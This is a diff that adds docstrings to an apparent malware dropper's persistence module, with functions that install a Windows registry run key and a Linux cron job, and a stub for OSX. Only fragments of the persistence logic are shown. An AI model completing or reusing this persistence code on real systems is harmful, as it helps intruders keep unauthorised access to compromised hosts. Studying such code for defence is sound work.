@@ -8,6 +8,7 @@ import argparse
 from shutil import copyfile
 
 def parse_args(self, args):
+    """Parse command argumenbts"""
 
     #Initial argument setup
     show = None
@@ -38,6 +39,8 @@ def parse_args(self, args):
     return settings
 
 def windows_persist(dropper, settings):
+    """PErsist in Windows via registry"""
+
     print("DEBUG - Windows persisting")
     #Actually persist
     if settings['method'] == "run_key" or settings['method'] == "default":
@@ -55,6 +58,8 @@ def windows_persist(dropper, settings):
 
 
 def linux_persist(dropper, settings):
+    """persist in linux via crontab"""
+
     print("DEBUG - Linux persisting")
     #Actually persist
     if settings['method'] == "cron" or settings['method'] == "default":
@@ -72,10 +77,14 @@ def linux_persist(dropper, settings):
 
 
 def osx_persist(dropper):
+    """TODO - Persist in OSX"""
+
     print("TODO - persist Mac style!")
     dropper.resp = "TODO - presist OSX style."
 
 def add_cron(dropper, mode='aggressive'):
+    """Add a cron job in a linux host"""
+
     #Setup info
     cron_dir = '/var/spool/cron/'
     file_name = sys.executable
@@ -140,6 +149,8 @@ def add_cron(dropper, mode='aggressive'):
     return True, "Added cron config : {}".format(cron_line)
 
 def add_run_key(dropper):
+    """Add a run key in a Windows host"""
+
     try:
         #Let's break the import rules, BECAUSE we want to be cross-platform
         import winreg
@@ -162,6 +173,8 @@ def add_run_key(dropper):
 
 
 def main(dropper, args=None):
+    """Get platform and persistence method, then call appropriate helper funcs"""
+
     settings = parse_args(args)
     if not settings:
         dropper.resp = "ERROR parsing args : {}".format(settings)
